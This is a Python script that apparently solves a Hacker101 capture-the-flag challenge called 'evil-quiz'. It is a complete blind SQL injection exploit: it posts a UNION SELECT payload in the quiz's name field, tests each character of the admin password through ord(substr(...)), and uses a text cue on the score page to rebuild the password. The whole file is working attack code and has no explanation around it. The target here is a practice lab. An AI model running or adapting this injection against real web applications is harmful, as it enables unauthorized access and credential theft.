#!/usr/bin/env python3
import requests

url='https://bde3786c05c50a06d8742f04cd612457.ctf.hacker101.com/evil-quiz'
cookies={'quizsession': 'd1fb7c5a05c2533991d7f7f64b377fb9'}
alphabet = 'SabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'

def attack(password):
    index=len(password)+1
    for letter in alphabet:
        data={'name': "Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
        r = requests.post(url, cookies=cookies, data=data)
        r = requests.get(url + '/score', cookies=cookies)
        if 'There is 1 other' in r.text:
            return password + letter
        else:
            print(f"no success with {letter}")
    return password

password=''
while True:
    np=attack(password)
    if np == password:
        print("Password found: '%s'" % (password))
        break
    password=np

